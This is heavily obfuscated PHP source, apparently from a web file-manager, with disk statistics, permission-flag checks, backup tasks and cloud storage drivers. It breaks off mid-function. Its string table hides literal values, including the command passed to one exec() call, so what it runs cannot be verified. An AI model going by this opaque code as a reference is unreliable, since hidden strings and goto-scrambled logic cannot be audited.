cã¹­âÒŞ¡; cã¹­âÒŞ¡: if ($eÈ¹‘ªºÉ == $d›ˆÎèÕóŠ[790]) { $BÑ·Ò‡ìÑõ = explode($d›ˆÎèÕóŠ[1201], $bòáÒÔÂ¼Ô[$d›ˆÎèÕóŠ[967]]); $eÈ¹‘ªºÉ = $BÑ·Ò‡ìÑõ[0]; } if ($eÈ¹‘ªºÉ == $d›ˆÎèÕóŠ[793] || $eÈ¹‘ªºÉ == $d›ˆÎèÕóŠ[794]) { $døÅîö£„Õ = Model()->db()->query($d›ˆÎèÕóŠ[1711]); $d¢îãÆØ¨İ = $døÅîö£„Õ[0] && isset($døÅîö£„Õ[0][$d›ˆÎèÕóŠ[1463]]) ? $døÅîö£„Õ[0][$d›ˆÎèÕóŠ[1463]] : 0; $eÈ¹‘ªºÉ = $d›ˆÎèÕóŠ[1712] . ($d¢îãÆØ¨İ ? $d›ˆÎèÕóŠ[8] . $d¢îãÆØ¨İ : $d›ˆÎèÕóŠ[33]); } $A”â§’ó = $GLOBALS[$d›ˆÎèÕóŠ[6]][$d›ˆÎèÕóŠ[347]][$d›ˆÎèÕóŠ[827]]; goto dÒğ¦ñÑŠô; cå‰¿ÇêñÇ: $d›ˆÎèÕóŠ =& $_SERVER[Ö‘Øù]; $Cø…Æ’’Äº = $this->diskDriver(); $aóÅ‘îáİ„ = KodIO::defaultDriver(); goto aŸ‹‰Õë«¢; aŸ‹‰Õë«¢: $aôôÕ‹Ÿğë = array($d›ˆÎèÕóŠ[817] => $aóÅ‘îáİ„[$d›ˆÎèÕóŠ[395]]); $a®ª¾Ç¿è‡ = Model($d›ˆÎèÕóŠ[465])->where($aôôÕ‹Ÿğë)->sum($d›ˆÎèÕóŠ[78]); $d¤ºñ‘¯‚ = explode($d›ˆÎèÕóŠ[50], $_SERVER[$d›ˆÎèÕóŠ[142]]); goto c¯‰›ÂÒ×¿; dÒğ¦ñÑŠô: return array($d›ˆÎèÕóŠ[1713] => $Cø…Æ’’Äº ? $Cø…Æ’’Äº[$d›ˆÎèÕóŠ[1714]] : 0, $d›ˆÎèÕóŠ[1715] => $Cø…Æ’’Äº ? $Cø…Æ’’Äº[$d›ˆÎèÕóŠ[1716]] : 0, $d›ˆÎèÕóŠ[1717] => (int) $aóÅ‘îáİ„[$d›ˆÎèÕóŠ[1714]] * 1024 * 1024 * 1024, $d›ˆÎèÕóŠ[1718] => (int) $a®ª¾Ç¿è‡, $d›ˆÎèÕóŠ[1719] => ucfirst($BÁ‹¤‘ŠÄ), $d›ˆÎèÕóŠ[1720] => $d›ˆÎèÕóŠ[1721] . PHP_VERSION, $d›ˆÎèÕóŠ[1722] => phpBuild64() ? 64 : 32, $d›ˆÎèÕóŠ[751] => str_replace($d›ˆÎèÕóŠ[1723], $d›ˆÎèÕóŠ[984], $eÈ¹‘ªºÉ), $d›ˆÎèÕóŠ[347] => ucfirst($A”â§’ó), $d›ˆÎèÕóŠ[28] => $_SERVER[$d›ˆÎèÕóŠ[1724]]); goto eÔë·‘Û; eÔë·‘Û: } private function diskDriver() { goto F®†õè‰; F®†õè‰: $C˜–ÖÒñ¯ =& $_SERVER[Ö‘Øù]; $F´ÔŞ¼ºâ‡ = $C˜–ÖÒñ¯[8]; $EÀ¥áˆµçõ = $GLOBALS[$C˜–ÖÒñ¯[6]][$C˜–ÖÒñ¯[1725]] == $C˜–ÖÒñ¯[1726]; goto E‘“øäÎ¬—; cÃáŠÀÚÒ­: $Aöë½ñäèš = $e³™‚Óì¯ö - @disk_free_space($F´ÔŞ¼ºâ‡); return array($C˜–ÖÒñ¯[1714] => $e³™‚Óì¯ö, $C˜–ÖÒñ¯[1716] => $Aöë½ñäèš); goto aÈå¯À£Ë; E‘“øäÎ¬—: if ($EÀ¥áˆµçõ) { $F´ÔŞ¼ºâ‡ = $C˜–ÖÒñ¯[1727]; if (function_exists($C˜–ÖÒñ¯[1728])) { exec($C˜–ÖÒñ¯[1729], $B‹±‘œŠê‰); $F´ÔŞ¼ºâ‡ = $B‹±‘œŠê‰[1] . $C˜–ÖÒñ¯[8]; } } if (!file_exists($F´ÔŞ¼ºâ‡)) { return; } $e³™‚Óì¯ö = @disk_total_space($F´ÔŞ¼ºâ‡); goto cÃáŠÀÚÒ­; aÈå¯À£Ë: } public function fileChart($eÍµÔÖÍÉŒ) { goto E®ÏªÙ¦¼ß; DÏã…›µ¡‰: $a‹Õ»¯ù¾ = $this->sourceSize(); $D–‚¯Ğˆ’Ê = array($BÍ…÷ò Ù[493] => 0, $BÍ…÷ò Ù[406] => 1); $Cç¯ˆÚ¦İø = Model($BÍ…÷ò Ù[825])->where($D–‚¯Ğˆ’Ê)->sum($BÍ…÷ò Ù[78]); goto BàäÏÙÓµ¢; E®ÏªÙ¦¼ß: $BÍ…÷ò Ù =& $_SERVER[Ö‘Øù]; if (isset($eÍµÔÖÍÉŒ[$BÍ…÷ò Ù[1561]])) { return Model($BÍ…÷ò Ù[825])->userFileTypeProfile($eÍµÔÖÍÉŒ[$BÍ…÷ò Ù[1561]]); } if (isset($eÍµÔÖÍÉŒ[$BÍ…÷ò Ù[1730]])) { return Model($BÍ…÷ò Ù[825])->groupFileTypeProfile($eÍµÔÖÍÉŒ[$BÍ…÷ò Ù[1730]]); } goto DÏã…›µ¡‰; BàäÏÙÓµ¢: $D–‚¯Ğˆ’Ê[$BÍ…÷ò Ù[406]] = 2; $FÅÁÊ×Ï = Model($BÍ…÷ò Ù[825])->where($D–‚¯Ğˆ’Ê)->sum($BÍ…÷ò Ù[78]); return array($BÍ…÷ò Ù[756] => $a‹Õ»¯ù¾[$BÍ…÷ò Ù[78]], $BÍ…÷ò Ù[1661] => $a‹Õ»¯ù¾[$BÍ…÷ò Ù[1661]], $BÍ…÷ò Ù[1662] => (int) $Cç¯ˆÚ¦İø, $BÍ…÷ò Ù[1663] => (int) $FÅÁÊ×Ï); goto D…¶¢Ã¾©à; D…¶¢Ã¾©à: } private function sourceSize() { $B„Ş¶»Æª =& $_SERVER[Ö‘Øù]; $Fé¡Ôˆ• = Model($B„Ş¶»Æª[825])->where(array($B„Ş¶»Æª[405] => 0))->sum($B„Ş¶»Æª[78]); $aÙ—šƒ‚øé = Model($B„Ş¶»Æª[465])->sum($B„Ş¶»Æª[78]); if ($aÙ—šƒ‚øé > $Fé¡Ôˆ•) { $aÙ—šƒ‚øé = $Fé¡Ôˆ•; } return array($B„Ş¶»Æª[78] => (int) $Fé¡Ôˆ•, $B„Ş¶»Æª[1661] => (int) $aÙ—šƒ‚øé); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $eÁÈ¹×è„™ =& $_SERVER[Ö‘Øù]; $fƒÌ•ªÀ‘‘ = array(array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1731]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1733], $eÁÈ¹×è„™[1734] => 1, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1737]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1738], $eÁÈ¹×è„™[1734] => 2, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1739]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1740], $eÁÈ¹×è„™[1734] => 3, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1741]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1742], $eÁÈ¹×è„™[1734] => 4, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => self::AUTH_SHOW | self::AUTH_VIEW), array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1743]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1744], $eÁÈ¹×è„™[1734] => 5, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1745]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1746], $eÁÈ¹×è„™[1734] => 6, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($eÁÈ¹×è„™[415] => LNG($eÁÈ¹×è„™[1747]), $eÁÈ¹×è„™[1732] => $eÁÈ¹×è„™[1748], $eÁÈ¹×è„™[1734] => 7, $eÁÈ¹×è„™[1735] => 1, $eÁÈ¹×è„™[1736] => 0)); return $fƒÌ•ªÀ‘‘; } public static function authCheck($c±íŠàÊ›°, $d±¥Í˜ºİå) { $c±íŠàÊ›° = intval($c±íŠàÊ›°); if ($GLOBALS[$_SERVER[Ö‘Øù][500]]) { return !0; } if ($c±íŠàÊ›° <= 0) { return !1; } if (($c±íŠàÊ›° & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c±íŠàÊ›° & $d±¥Í˜ºİå); } public static function authCheckShow($Bœ½ˆãìÀ¦) { return self::authCheck($Bœ½ˆãìÀ¦, self::AUTH_SHOW); } public static function authCheckView($A“ñİäÙæ) { return self::authCheck($A“ñİäÙæ, self::AUTH_VIEW); } public static function authCheckDownload($b‰Ó„ºè±Û) { return self::authCheck($b‰Ó„ºè±Û, self::AUTH_DOWNLOAD); } public static function authCheckUpload($EÖÒ¡Éğİã) { return self::authCheck($EÖÒ¡Éğİã, self::AUTH_UPLOAD); } public static function authCheckEdit($A¤æØÆ„¶Œ) { return self::authCheck($A¤æØÆ„¶Œ, self::AUTH_EDIT); } public static function authCheckRemove($EÉ–ï¹‘Ÿ×) { return self::authCheck($EÉ–ï¹‘Ÿ×, self::AUTH_REMOVE); } public static function authCheckShare($cë…ÍØ¨÷) { return self::authCheck($cë…ÍØ¨÷, self::AUTH_SHARE); } public static function authCheckComment($D¿™ÌÂğ‘Ÿ) { return self::authCheck($D¿™ÌÂğ‘Ÿ, self::AUTH_COMMENT); } public static function authCheckEvent($f¸½Ñ¨·º¯) { return self::authCheck($f¸½Ñ¨·º¯, self::AUTH_EVENT); } public static function authCheckRoot($B‹àÖáç³ƒ) { return self::authCheck($B‹àÖáç³ƒ, self::AUTH_ROOT); } public static function authCheckAction($B§ÊÈ³ù‘Ğ, $eÂ—ÎÌ£îŠ) { goto aãŒºö®Úñ; bƒÄ®±‹: $D·˜¦® ¶Ï = $E•–Ã“Ù—[$eÂ—ÎÌ£îŠ]; $B§ÊÈ³ù‘Ğ = intval($B§ÊÈ³ù‘Ğ); if ($B§ÊÈ³ù‘Ğ <= 0) { return !1; } goto AÜİëÅñâˆ; AÜİëÅñâˆ: if (($B§ÊÈ³ù‘Ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($B§ÊÈ³ù‘Ğ & $D·˜¦® ¶Ï); goto Dª´’í„; aãŒºö®Úñ: $a¦ß—÷›Ó =& $_SERVER[Ö‘Øù]; $E•–Ã“Ù— = array($a¦ß—÷›Ó[1749] => self::AUTH_VIEW, $a¦ß—÷›Ó[1128] => self::AUTH_DOWNLOAD, $a¦ß—÷›Ó[107] => self::AUTH_UPLOAD, $a¦ß—÷›Ó[1697] => self::AUTH_EDIT, $a¦ß—÷›Ó[1696] => self::AUTH_REMOVE, $a¦ß—÷›Ó[1707] => self::AUTH_SHARE, $a¦ß—÷›Ó[352] => self::AUTH_COMMENT, $a¦ß—÷›Ó[1549] => self::AUTH_EVENT, $a¦ß—÷›Ó[1750] => self::AUTH_ROOT); if (!isset($E•–Ã“Ù—[$eÂ—ÎÌ£îŠ])) { return; } goto bƒÄ®±‹; Dª´’í„: } public static function authDisable($c‰Î˜ãÉ‡¶, $fÆ›ªÓÆÙç) { if (intval($c‰Î˜ãÉ‡¶) <= 0) { return 0; } return intval($c‰Î˜ãÉ‡¶) & ~$fÆ›ªÓÆÙç; } public $optionType = "\123\x79\163\x74\145\x6d\56\163\x6f\165\162\x63\x65\101\x75\x74\150\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\141\x75\164\x68", "\154\x61\142\x65\154", "\144\x69\x73\160\154\141\x79", "\163\x79\163\164\x65\155", "\163\157\162\164"); public function initData() { $CÖã™«Æ»¶ = $this->authDefault(); foreach ($CÖã™«Æ»¶ as $cÏ‰¢«Õ¾ˆ) { $this->add($cÏ‰¢«Õ¾ˆ); } } public function findAuth($A”“—„ùêö, $Fˆˆß·¤åÊ) { $eèùÆ…æÔİ =& $_SERVER[Ö‘Øù]; $AÂ„º÷³®Ì = parent::listData(); foreach ($AÂ„º÷³®Ì as $d§í™Ğ«ã) { $e„İ²¼Øá = intval($d§í™Ğ«ã[$eèùÆ…æÔİ[408]]); if ($e„İ²¼Øá <= 0 || $d§í™Ğ«ã[$eèùÆ…æÔİ[1751]] == 0) { continue; } if (($e„İ²¼Øá & $A”“—„ùêö) != $A”“—„ùêö) { continue; } if (($e„İ²¼Øá & $Fˆˆß·¤åÊ) != 0) { continue; } return $d§í™Ğ«ã[$eèùÆ…æÔİ[395]]; } return !1; } public function findAuthReadOnly() { $c®Ö—ÅŠ“Œ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $EÍ¹İ™ÄŠÖ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($c®Ö—ÅŠ“Œ, $EÍ¹İ™ÄŠÖ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($bªáŒ„¤Œ = false, $B‡ğ…‘é© = "\x73\x6f\162\x74", $bí¨èÆ¼Ûñ = false) { return parent::listData($bªáŒ„¤Œ, $B‡ğ…‘é©, $bí¨èÆ¼Ûñ); } public function update($a‘ºùëóğ™, $c˜ÊÙğ¢è) { $CÉ«åÉ¦ë =& $_SERVER[Ö‘Øù]; $E§ØõÛ÷¾Š = parent::listData($a‘ºùëóğ™); $D¡‹ÊŞİè = $this->findByName($c˜ÊÙğ¢è[$CÉ«åÉ¦ë[28]]); if (!$E§ØõÛ÷¾Š || $D¡‹ÊŞİè && $D¡‹ÊŞİè[$CÉ«åÉ¦ë[395]] != $E§ØõÛ÷¾Š[$CÉ«åÉ¦ë[395]]) { return !1; } $this->filterAuth($c˜ÊÙğ¢è[$CÉ«åÉ¦ë[408]]); return parent::update($a‘ºùëóğ™, $c˜ÊÙğ¢è); } public function remove($bô»½¡Åœá) { $EµÃ‹·ß = parent::listData($bô»½¡Åœá); if (!$EµÃ‹·ß || $EµÃ‹·ß[$_SERVER[Ö‘Øù][1205]]) { return !1; } return parent::remove($bô»½¡Åœá); } public function add($aâ¥Ï±ÊšŸ = array()) { goto FŠÅ·Ş”­é; C­ßÅ¡§Ş¾: return parent::insert($aâ¥Ï±ÊšŸ); goto A®ŠÜ·¦Éš; FŠÅ·Ş”­é: $Eçé’Õ¤©ö =& $_SERVER[Ö‘Øù]; if ($this->findByName($aâ¥Ï±ÊšŸ[$Eçé’Õ¤©ö[28]])) { return !1; } $dêÔ™ ù¥‡ = array($Eçé’Õ¤©ö[28] => $Eçé’Õ¤©ö[33], $Eçé’Õ¤©ö[408] => 1, $Eçé’Õ¤©ö[1752] => $Eçé’Õ¤©ö[1740], $Eçé’Õ¤©ö[1751] => 1, $Eçé’Õ¤©ö[1205] => 0, $Eçé’Õ¤©ö[1753] => 0); goto DîˆÛ–Œ‘; DîˆÛ–Œ‘: $aâ¥Ï±ÊšŸ = array_merge($dêÔ™ ù¥‡, $aâ¥Ï±ÊšŸ); $aâ¥Ï±ÊšŸ[$Eçé’Õ¤©ö[1753]] = $this->getSort(); $this->filterAuth($aâ¥Ï±ÊšŸ[$Eçé’Õ¤©ö[408]]); goto C­ßÅ¡§Ş¾; A®ŠÜ·¦Éš: } private function getSort() { $A‚´§˜è¯å =& $_SERVER[Ö‘Øù]; $A’Óƒ®Üä¸ = parent::listData(); $Eç‘˜Â–œÒ = array_to_keyvalue($A’Óƒ®Üä¸, $A‚´§˜è¯å[33], $A‚´§˜è¯å[1753]); return empty($Eç‘˜Â–œÒ) ? 0 : max($Eç‘˜Â–œÒ) + 1; } private function filterAuth(&$E´à‹—è) { goto dÏ”ïô»¼†; EÅŠâÕ»øŠ: foreach ($f£›âŒ Ï¾ as $BÜ‹µ•¬ÌÃ) { if ($E´à‹—è & $BÜ‹µ•¬ÌÃ) { $B¯‹•êğäİ[] = $BÜ‹µ•¬ÌÃ; } } if (in_array(self::AUTH_ROOT, $B¯‹•êğäİ)) { $E´à‹—è = array_sum($f£›âŒ Ï¾); return; } $e¸ÁÚÙÔ÷• = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto CßÜ¹ğè´¿; CßÜ¹ğè´¿: foreach ($B¯‹•êğäİ as $BÜ‹µ•¬ÌÃ) { if (isset($e¸ÁÚÙÔ÷•[$BÜ‹µ•¬ÌÃ])) { $B¯‹•êğäİ = array_merge($B¯‹•êğäİ, $e¸ÁÚÙÔ÷•[$BÜ‹µ•¬ÌÃ]); } } $B¯‹•êğäİ[] = self::AUTH_SHOW; $E´à‹—è = array_sum(array_unique($B¯‹•êğäİ)); goto BÆê­Öõ´è; dÏ”ïô»¼†: if (!$E´à‹—è) { return; } $f£›âŒ Ï¾ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $B¯‹•êğäİ = array(); goto EÅŠâÕ»øŠ; BÆê­Öõ´è: } public function sort($aÂàİĞ¿¥, $Dåª“À¤Ôä) { return parent::update($aÂàİĞ¿¥, $Dåª“À¤Ôä); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\142\141\x63\x6b\x75\160\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\x6e\x61\x6d\x65", "\163\x74\x61\x74\165\x73", "\143\x6f\156\164\x65\x6e\164", "\155\x61\156\x75\141\x6c", "\162\x65\163\165\154\164", "\164\151\155\145\106\x72\157\x6d", "\164\x69\x6d\x65\124\157"); public function config() { goto BøÖ¿ñõ­©; Fî†«©–¬•: $BĞÓòƒ²œé = Model($eëøù°×ê[1756])->findByKey($eëøù°×ê[1549], $eŸ›‡º•™ˆ); if (!$BĞÓòƒ²œé) { $BĞÓòƒ²œé = array(); } if (isset($BĞÓòƒ²œé[$eëøù°×ê[197]])) { $BĞÓòƒ²œé[$eëøù°×ê[197]] = json_decode($BĞÓòƒ²œé[$eëøù°×ê[197]], !0); } goto f´¯È‰æ¢¬; dƒ®²óªÏÖ: $AÛµĞî°­ = is_array($AÛµĞî°­) ? $AÛµĞî°­ : array(); if (!isset($AÛµĞî°­[$eëøù°×ê[748]])) { $AÛµĞî°­[$eëøù°×ê[748]] = $eëøù°×ê[87]; } unset($AÛµĞî°­[$eëøù°×ê[1531]]); goto fŠÄŞÓŒÆˆ; f´¯È‰æ¢¬: if (isset($AÛµĞî°­[$eëøù°×ê[197]])) { $BĞÓòƒ²œé[$eëøù°×ê[197]][$eëøù°×ê[1534]] = $AÛµĞî°­[$eëøù°×ê[197]]; unset($AÛµĞî°­[$eëøù°×ê[197]]); } return array_merge($BĞÓòƒ²œé, $AÛµĞî°­); goto cÆÕøã±”ê; fŠÄŞÓŒÆˆ: Action($eëøù°×ê[1754])->taskInit(); Model($eëøù°×ê[1530])->cacheClear(); $eŸ›‡º•™ˆ = $eëøù°×ê[1755]; goto Fî†«©–¬•; BøÖ¿ñõ­©: $eëøù°×ê =& $_SERVER[Ö‘Øù]; $AÛµĞî°­ = Model($eëøù°×ê[763])->get($eëøù°×ê[775]); $AÛµĞî°­ = json_decode($AÛµĞî°­, !0); goto dƒ®²óªÏÖ; cÆÕøã±”ê: } public function listData($EµÔ³·ŸîÒ = false, $Dò²¸©äÁ‚ = "\x6d\157\144\151\146\171\124\151\155\x65", $FôŞ´óÔ¬ä = false) { return parent::listData($EµÔ³·ŸîÒ, $Dò²¸©äÁ‚, !0); } public function lastItem() { $bòÜÒëé‘¶ = $this->listData(); return !empty($bòÜÒëé‘¶[0]) ? $bòÜÒëé‘¶[0] : null; } public function kill($a…ù®ŠÚ¨—) { goto D´ƒË Îù»; Fä’‘ŞƒÑ: return $this->remove($a…ù®ŠÚ¨—); goto Aãª™¢‚ ¿; D´ƒË Îù»: $b‡ÖöãŞî× =& $_SERVER[Ö‘Øù]; $d†è§Ó’‘ = $this->listData($a…ù®ŠÚ¨—); if (!$d†è§Ó’‘ || empty($d†è§Ó’‘[$b‡ÖöãŞî×[28]])) { return !0; } goto bÒ¿ƒáèö; bÒ¿ƒáèö: Task::kill($b‡ÖöãŞî×[774]); Task::kill($b‡ÖöãŞî×[799]); Task::kill($b‡ÖöãŞî×[809]); goto Aßº‡ïÛ¯¾; Aßº‡ïÛ¯¾: $D†ß¤ùø‡¸ = $d†è§Ó’‘[$b‡ÖöãŞî×[28]]; $D¤ƒÙšÙë = TEMP_FILES . $b‡ÖöãŞî×[771] . $D†ß¤ùø‡¸ . $b‡ÖöãŞî×[8]; IO::remove($D¤ƒÙšÙë, !1); goto Fä’‘ŞƒÑ; Aãª™¢‚ ¿: } public function remove($DŸ©™ØèÎø) { $f×ƒ’ÛÊ£ = $this->listData($DŸ©™ØèÎø); if (!$f×ƒ’ÛÊ£) { return !0; } return $this->backupRemove($f×ƒ’ÛÊ£); } private function backupRemove($c¹Šõ½è³ğ) { parent::remove($c¹Šõ½è³ğ[$_SERVER[Ö‘Øù][395]]); $a¾ªãÛÏõ = $this->backupPath($c¹Šõ½è³ğ); IO::remove($a¾ªãÛÏõ, !1); return !0; } private function backupPath($E„ëˆƒ¾È) { $DÍÆ–Œ²®Ñ =& $_SERVER[Ö‘Øù]; $cÀÒïÕäë = $E„ëˆƒ¾È[$DÍÆ–Œ²®Ñ[28]]; $b—¹Õ‡‰Ñ = Model($DÍÆ–Œ²®Ñ[763])->get($DÍÆ–Œ²®Ñ[764]); $c¸î†ö¶ = substr(md5($DÍÆ–Œ²®Ñ[765] . $b—¹Õ‡‰Ñ . $cÀÒïÕäë), 0, 8); return "\173\151\x6f\x3a{$E„ëˆƒ¾È[$DÍÆ–Œ²®Ñ[745]]}\175\x2f\144\141\x74\x61\x62\141\163\x65\57\x62\141\x63\x6b\165\160\57" . $cÀÒïÕäë . $DÍÆ–Œ²®Ñ[71] . $c¸î†ö¶; } public function start() { goto c²ÊâêØ¯÷; F˜ß‡´½ïš: if (!$Añ³ò÷£ || $Añ³ò÷£[$d½Í…¦Â‹Õ[1531]] != $d½Í…¦Â‹Õ[87]) { return !1; } $d¡ƒÎÏåùÂ = $this->process(); foreach ($d¡ƒÎÏåùÂ as $Eğ´êÚŸæß) { if ($Eğ´êÚŸæß) { return Task::restart($Eğ´êÚŸæß[$d½Í…¦Â‹Õ[395]]); } } goto e…Ì¿æ´ºö; e…Ì¿æ´ºö: $añÖ·œ¼™ = new Backup(); $bì‹ôİÅ¥ = $añÖ·œ¼™->db(); if ($bì‹ôİÅ¥) { $bì‹ôİÅ¥ = $añÖ·œ¼™->dbFile(); if ($bì‹ôİÅ¥ && $Añ³ò÷£[$d½Í…¦Â‹Õ[748]] == $d½Í…¦Â‹Õ[191]) { $bì‹ôİÅ¥ = $añÖ·œ¼™->file(); } } goto BŒÉ­ñ×Òä; c²ÊâêØ¯÷: $d½Í…¦Â‹Õ =& $_SERVER[Ö‘Øù]; if ($GLOBALS[$d½Í…¦Â‹Õ[6]][$d½Í…¦Â‹Õ[88]][$d½Í…¦Â‹Õ[1757]] != $d½Í…¦Â‹Õ[87]) { return !0; } $Añ³ò÷£ = $this->config(); goto F˜ß‡´½ïš; BŒÉ­ñ×Òä: Backup::set(array($d½Í…¦Â‹Õ[743] => 1, $d½Í…¦Â‹Õ[491] => time())); return !0; goto c—ŞÚì©¾…; c—ŞÚì©¾…: } public function process() { $dœíáë‘“ =& $_SERVER[Ö‘Øù]; return array($dœíáë‘“[751] => Task::get($dœíáë‘“[774]), $dœíáë‘“[755] => Task::get($dœíáë‘“[799]), $dœíáë‘“[193] => Task::get($dœíáë‘“[809])); } public function restore() { $E½’ù¨§öæ =& $_SERVER[Ö‘Øù]; ActionCall($E½’ù¨§öæ[1053], !0, 1); ActionCall($E½’ù¨§öæ[1053], !0, 0); } } goto B‹¸—ïËŞ; bÇ°Â®™š: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($eô±ÛÓ–†‹) { parent::__construct($eô±ÛÓ–†‹); $this->signatureVersion($_SERVER[Ö‘Øù][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($eù‡«ŠíÃá) { parent::__construct($eù‡«ŠíÃá); $this->signatureVersion($_SERVER[Ö‘Øù][212]); } public function fileOutLink($e™‚á‚ˆÁ…) { $dÑà”†Ô­± =& $_SERVER[Ö‘Øù]; if (substr($e™‚á‚ˆÁ…, 0, 7) == $dÑà”†Ô­±[1238]) { $e™‚á‚ˆÁ… = $dÑà”†Ô­±[1239] . substr($e™‚á‚ˆÁ…, 7); } header($dÑà”†Ô­±[159] . $e™‚á‚ˆÁ…); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($fàºß‡¬“Â) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ö‘Øù][1294]; $this->_init($fàºß‡¬“Â); } public function _init($Cœå‹¥»„) { $CÕŒĞÎ³‡ =& $_SERVER[Ö‘Øù]; foreach ($Cœå‹¥»„ as $D–¸„•»š‘ => $C¨°´“¾¹Î) { if (isset($this->{$D–¸„•»š‘})) { $this->{$D–¸„•»š‘} = $C¨°´“¾¹Î; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($CÕŒĞÎ³‡[1295] . LNG($CÕŒĞÎ³‡[1296])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aòÂ”ö‡åé; a«“ä‹šˆ: $ešçà¿ï->addAllowedMethod($C–Œƒ‘œĞÄ[1300]); $ešçà¿ï->addAllowedMethod($C–Œƒ‘œĞÄ[1301]); $ešçà¿ï->addAllowedMethod($C–Œƒ‘œĞÄ[158]); goto a¬ñùŸâÇ¹; fä®ºí‹­İ: $ešçà¿ï->addAllowedOrigin($C–Œƒ‘œĞÄ[1297]); $ešçà¿ï->addAllowedMethod($C–Œƒ‘œĞÄ[1298]); $ešçà¿ï->addAllowedMethod($C–Œƒ‘œĞÄ[1299]); goto a«“ä‹šˆ; CˆÏµ»Ùˆ: $A÷•¾ï‚ó¤->addRule($ešçà¿ï); try { $this->client->putBucketCors($this->bucket, $A÷•¾ï‚ó¤); } catch (OSS\Core\OssException $a¢éšç­) { return !1; } return !0; goto cÉŒ «¯ï; aòÂ”ö‡åé: $C–Œƒ‘œĞÄ =& $_SERVER[Ö‘Øù]; $A÷•¾ï‚ó¤ = new OSS\Model\CorsConfig(); $ešçà¿ï = new OSS\Model\CorsRule(); goto fä®ºí‹­İ; a¬ñùŸâÇ¹: $ešçà¿ï->setMaxAgeSeconds(600); $ešçà¿ï->addExposeHeader($C–Œƒ‘œĞÄ[1302]); $ešçà¿ï->addAllowedHeader($C–Œƒ‘œĞÄ[1297]); goto CˆÏµ»Ùˆ; cÉŒ «¯ï: } public function getBucketCors() { goto aÇŒÏ‘˜È; Dß…À¸åÊ: $C§ÀÕšÀŒ = $c“Ü°À‡îÚ[0]->getMaxAgeSeconds(); $c°šÅ£Ò•Ä = $c“Ü°À‡îÚ[0]->getExposeHeaders(); $Bˆ¤µÏº›ˆ = $c“Ü°À‡îÚ[0]->getAllowedHeaders(); goto 